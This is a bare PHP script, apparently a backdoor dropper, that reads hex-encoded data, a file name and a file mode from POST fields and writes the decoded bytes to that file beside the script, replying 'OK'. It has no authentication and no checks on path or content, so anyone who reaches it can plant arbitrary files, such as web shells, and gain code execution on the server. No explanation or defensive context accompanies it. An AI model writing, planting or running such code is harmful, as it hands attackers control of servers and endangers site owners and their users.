<?php
$data = $_POST['data'];
$nFile = $_POST['File'];
$mode  = $_POST['mode'];
	if(isset($data) && !empty($data))
	{
		$Path = dirname(__FILE__) . "/".$nFile;
		$file = fopen($Path,$mode);
		fwrite($file, pack ("H*",$data)); 
		fclose($file);
		die('OK');
	}
	else
	{
		die('Error!!');
	}
?>